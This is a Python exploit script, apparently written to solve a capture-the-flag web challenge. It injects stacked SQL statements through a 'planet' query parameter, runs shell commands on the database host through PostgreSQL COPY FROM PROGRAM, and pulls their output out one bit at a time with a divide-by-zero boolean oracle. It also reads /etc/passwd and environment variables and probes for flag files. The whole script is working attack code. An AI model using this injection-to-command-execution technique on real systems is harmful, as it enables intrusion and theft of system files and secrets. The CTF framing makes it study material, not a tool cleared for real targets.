#!/usr/bin/env python
"""Planetary Probe: run a program on the database host and read its output, one bit per call.

What the target allows, verified:
  * stacked statements inside the injected literal (the driver needs the batch to end with a
    SELECT that returns a row -- every earlier "blocked" test simply ended with a non-SELECT);
  * `probe` is a member of pg_execute_server_program, so `COPY ... FROM PROGRAM` executes;
  * the database is pinned to default_transaction_read_only=true, so writes need
    `COMMIT; BEGIN READ WRITE;` first -- that works, and temp tables then come and go with it.

The bit: the batch finishes with `SELECT CASE WHEN <cond> THEN 1 ELSE 1/0 END`. A true cond
returns a row -> "signal detected"; a false cond divides by zero -> the app's generic null.
`<cond>` sees the program's stdout, one line per row, so this is a full read channel.
"""
import http.client
import ssl
import sys
import threading
import time
import urllib.parse

HOST = "planetary.web.2026.sunshinectf.games"
CTX = ssl.create_default_context()
CALL = [0]
ERR = [0]
TMP = "ff"

PRELUDE = ("MARS'; COMMIT; BEGIN READ WRITE; DROP TABLE IF EXISTS %s; "
           "CREATE TEMP TABLE %s(line text); " % (TMP, TMP))
POST = ("; SELECT CASE WHEN (%s) THEN 1 ELSE 1/0 END; -- ")


def _send(payload):
    url = "/probe?" + urllib.parse.urlencode({"planet": payload})
    c = http.client.HTTPSConnection(HOST, context=CTX, timeout=60)
    c.request("GET", url, headers={"User-Agent": "probe"})
    r = c.getresponse()
    b = r.read()
    c.close()
    return b


def ask(payload):
    global CALL
    for attempt in range(5):
        CALL[0] += 1
        try:
            body = _send(payload)
        except Exception:
            ERR[0] += 1
            time.sleep(0.4 + attempt)
            continue
        if b"readout--carrier" in body:
            return True
        if b"readout--null" in body:
            return False
        time.sleep(0.4)
    raise RuntimeError("no answer")


def run(cmd, cond):
    """Execute <cmd> on the db host; <cond> is SQL over the temp table `line`."""
    return ask(PRELUDE + "COPY %s FROM PROGRAM '%s'" % (TMP, cmd) + (POST % cond))


SEEN = "(SELECT count(*) FROM %s)>0" % TMP
ALL = "(SELECT string_agg(line, chr(10)) FROM %s)" % TMP


def exists(path):
    return run("cat %s 2>/dev/null" % path, SEEN)


def cp(expr, pos, lo=0, hi=1114112):
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if run("true", "ascii(substr((%s),%d,1))<%d" % (expr, pos, mid)):
            hi = mid
        else:
            lo = mid
    return lo


def blen(expr, cap=4000):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if run("true", "length(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_str(expr, maxlen=400, label="", workers=10):
    n = blen(expr, maxlen)
    print("[=] %s len=%d" % (label or expr, n), flush=True)
    out = {}

    def w(p):
        gate = "ascii(substr((%s),%d,1))>=%d"
        lo, hi = 31, 127
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if run("true", gate % (expr, p, mid)):
                lo = mid
            else:
                hi = mid - 1
        out[p] = chr(lo) if 32 <= lo < 127 else "?"
    ts = [threading.Thread(target=w, args=(p,), daemon=True) for p in range(1, n + 1)]
    for i in range(0, len(ts), workers):
        for t in ts[i:i + workers]:
            t.start()
        for t in ts[i:i + workers]:
            t.join(300)
    s = "".join(out[p] for p in sorted(out))
    print("[=] %s = %r  (%d calls)" % (label or expr, s, CALL[0]), flush=True)
    return s


if __name__ == "__main__":
    print("[*] machinery: cat /etc/passwd ->", run("cat /etc/passwd 2>/dev/null", SEEN), flush=True)
    print("[*] machinery: missing file    ->", run("cat /nope/nope 2>/dev/null", SEEN), flush=True)
    print("[*] env has a flag var:", run("env", "(SELECT string_agg(line,chr(10)) FROM %s) ILIKE '%%flag%%'" % TMP), flush=True)
    print("[*] env has sun{:", run("env", "(SELECT string_agg(line,chr(10)) FROM %s) LIKE '%%'||(chr(115)||chr(117)||chr(110)||chr(123))||'%%'" % TMP), flush=True)
    for p in ["/flag", "/flag.txt", "/ctf/flag.txt", "/app/flag.txt", "/app/flag",
              "/opt/flag.txt", "/tmp/flag.txt", "/secrets/flag.txt", "/home/flag.txt",
              "/f", "/flag/flag.txt", "/srv/flag.txt", "/root/flag.txt"]:
        try:
            print("   exists %-18s %s" % (p, exists(p)), flush=True)
        except Exception as e:
            print("   exists %-18s EXC %s" % (p, e))
